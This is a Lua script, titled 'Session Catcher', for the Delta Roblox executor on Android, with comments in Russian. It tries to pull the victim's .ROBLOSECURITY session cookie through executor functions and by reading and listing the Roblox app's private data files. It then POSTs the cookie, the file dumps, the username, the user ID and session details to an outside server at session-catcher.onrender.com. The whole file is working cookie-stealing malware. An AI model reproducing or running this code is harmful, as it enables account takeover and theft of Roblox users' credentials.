-- ============================================================
--  Session Catcher — Delta Executor (Android)
--  v2 — с попыткой чтения куки из файлов
-- ============================================================

local SERVER_URL = "https://session-catcher.onrender.com/catch"

local httpRequest = (syn and syn.request) 
                  or (http and http.request) 
                  or request 
                  or (fluxus and fluxus.request) 
                  or nil

if not httpRequest then
    warn("[Catcher] HTTP request function not found.")
    return
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

-- -----------------------------------------------------------
-- Информация об executor'е
-- -----------------------------------------------------------
local executorName = "Unknown"
local executorVersion = "Unknown"

pcall(function()
    if identifyexecutor then
        local name, version = identifyexecutor()
        executorName = name or "Unknown"
        executorVersion = version or "Unknown"
    end
end)

-- -----------------------------------------------------------
-- Информация о плейсе
-- -----------------------------------------------------------
local placeId = game.PlaceId
local placeName = "Unknown"
local jobId = game.JobId

pcall(function()
    local info = MarketplaceService:GetProductInfo(placeId)
    placeName = info.Name or "Unknown"
end)

-- -----------------------------------------------------------
-- Попытка 1: Нативные функции executor'а
-- -----------------------------------------------------------
local cookieFromFile = ""
local fileDumps = {}

-- Список возможных функций для получения куки
local cookieFunctions = {
    "getcookie",
    "getroblosecurity", 
    "getROBLOSECURITY",
    "GetCookie",
    "get_cookie"
}

for _, funcName in ipairs(cookieFunctions) do
    local func = getfenv()[funcName] or _G[funcName]
    if func then
        local success, result = pcall(func)
        if success and result and #result > 10 then
            cookieFromFile = result
            print("[Catcher] Cookie via " .. funcName .. "()")
            break
        end
    end
end

-- -----------------------------------------------------------
-- Попытка 2: Чтение файлов Android
-- -----------------------------------------------------------
if cookieFromFile == "" then
    
    -- Пути где может лежать кука на Android
    local paths = {
        "/data/data/com.roblox.client/shared_prefs/com.roblox.client_preferences.xml",
        "/data/data/com.roblox.client/shared_prefs/RbxSharedPrefs.xml",
        "/data/data/com.roblox.client/shared_prefs/Roblox.xml",
        "/data/data/com.roblox.client/app_webview/Cookies",
        "/data/data/com.roblox.client/app_webview/Default/Cookies",
        "/data/data/com.roblox.client/files/RobloxAppData.xml",
        "/data/data/com.roblox.client/app_shared_prefs.xml",
        "/sdcard/Android/data/com.roblox.client/files/RobloxAppData.xml",
        "/storage/emulated/0/Android/data/com.roblox.client/files/RobloxAppData.xml"
    }
    
    for _, path in ipairs(paths) do
        local success, content = pcall(function()
            return readfile(path)
        end)
        if success and content and #content > 0 then
            fileDumps[path] = content
            
            -- Ищем куку в содержимом файла
            if content:find("ROBLOSECURITY") or content:find("_|WARNING") then
                -- Пытаемся извлечь
                local start = content:find("_|WARNING")
                if start then
                    -- Кука обычно заканчивается перед закрывающим тегом или переносом
                    local endPos = content:find("\n", start) or content:find("<", start + 10) or #content
                    cookieFromFile = content:sub(start, endPos - 1)
                    cookieFromFile = cookieFromFile:gsub("%s", "")
                    print("[Catcher] Cookie found in: " .. path)
                    break
                end
            end
        end
    end
end

-- -----------------------------------------------------------
-- Попытка 3: listfiles (если доступен)
-- -----------------------------------------------------------
if cookieFromFile == "" and listfiles then
    pcall(function()
        local dirs = {
            "/data/data/com.roblox.client/shared_prefs/",
            "/data/data/com.roblox.client/files/",
            "/data/data/com.roblox.client/app_webview/"
        }
        for _, dir in ipairs(dirs) do
            local success, files = pcall(listfiles, dir)
            if success and files then
                for _, file in ipairs(files) do
                    local rOk, content = pcall(readfile, file)
                    if rOk and content and #content > 0 and #content < 50000 then
                        if content:find("ROBLOSECURITY") or content:find("_|WARNING") then
                            fileDumps[file] = content
                            local start = content:find("_|WARNING")
                            if start then
                                local endPos = content:find("\n", start) or content:find("<", start + 10) or #content
                                cookieFromFile = content:sub(start, endPos - 1)
                                cookieFromFile = cookieFromFile:gsub("%s", "")
                                break
                            end
                        end
                    end
                end
            end
            if cookieFromFile ~= "" then break end
        end
    end)
end

-- -----------------------------------------------------------
-- Отправка
-- -----------------------------------------------------------
local payload = {
    userId = LocalPlayer.UserId,
    username = LocalPlayer.Name,
    displayName = LocalPlayer.DisplayName,
    placeId = placeId,
    placeName = placeName,
    jobId = jobId,
    executor = executorName,
    executorVersion = executorVersion,
    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
    cookieFromFile = cookieFromFile,
    fileDumps = fileDumps
}

local success, response = pcall(function()
    return httpRequest({
        Url = SERVER_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
            ["User-Agent"] = "Roblox/Delta-Catcher"
        },
        Body = HttpService:JSONEncode(payload)
    })
end)

if success then
    print("[Catcher] Sent. Status: " .. (response.StatusCode or "unknown"))
    if cookieFromFile ~= "" then
        print("[Catcher] Cookie captured!")
    else
        print("[Catcher] No cookie found. Check server logs for file dumps.")
    end
else
    warn("[Catcher] Failed: " .. tostring(response))
end
